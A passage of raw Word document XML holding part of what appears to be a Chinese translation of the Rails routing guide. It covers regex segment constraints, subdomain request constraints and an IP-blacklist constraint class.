                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /[A-Z]\d{5}/ }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28A6BBB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这个路由将会匹配像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/A12345</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的路由。你可以用如此更简洁的方式来写出这个规则：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4DF8A417" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F7B0843" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="652173377"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show', :id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /[A-Z]\d{5}/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56BBF79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在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:constraints</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项中使用正则表达式有一个限制，就是在正则匹配中无法使用锚元素来匹配，像这样的路由规则是无效的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7416"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="48FB8C05" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0415877D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="589654411"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'posts#show', :constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /^\d/}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75376BD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总之，确定你没有在路由正则中使用锚元素。因为每个路由规则在匹配的时候就已经用到了锚元素。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A30F0A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例如，下面的路由 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器共享了一个命名空间，他们根据 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 值的首字符是否是数字来区分，像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1-hello-world</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下面去，而像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>david</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下面去。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="75EA298E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="728CC62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match '/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'posts#show', :constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /\d.+/ }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D9B9D3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match '/:username'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'users#show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="334914BD"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3.9 请求限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AD5CB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您还可以在原有路由规则的基础上限定任何的</w:t>
      </w:r>
      <w:hyperlink r:id="rId396" w:anchor="9" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Request</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">的对象，它将返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CAD25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你可以用一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>constraint</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关键字指定一个请求限制：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1541B893" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DF32E3E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="327443538"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "photos", :constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:subdomain</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15528DC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你也可以用代码块的形式来体现这样的限制</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="419F0596" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B161C3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namespace :admin</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3A44DBF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constraints :subdomain</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "admin"</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7EB7943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:photos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63BD8A4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796F65B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0CA62423"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3.10 高级限定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC5019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如果你需要更为高级的限定，你只要为 Rails 提供一个能相应 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>matches?</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的对象就可以。例如你想要把所有在黑名单中的用户都被路由过滤到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>BlacklistController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里面去。 你可以：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="46D38DAF" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CDBFF5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class</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>BlacklistConstraint</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EE05B0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initialize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3010863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@ips</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Blacklist.retrieve_ips</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04F8C24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56419AF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2DE2138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def</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>matches?(request)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5512EA5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@ips.include?(request.remote_ip)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51B416F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end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04E0FC8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p w14:paraId="4643E2B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355D580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TwitterClone::Application.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5905E9D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match "*path"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "blacklist#index",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52E7CD6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:constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
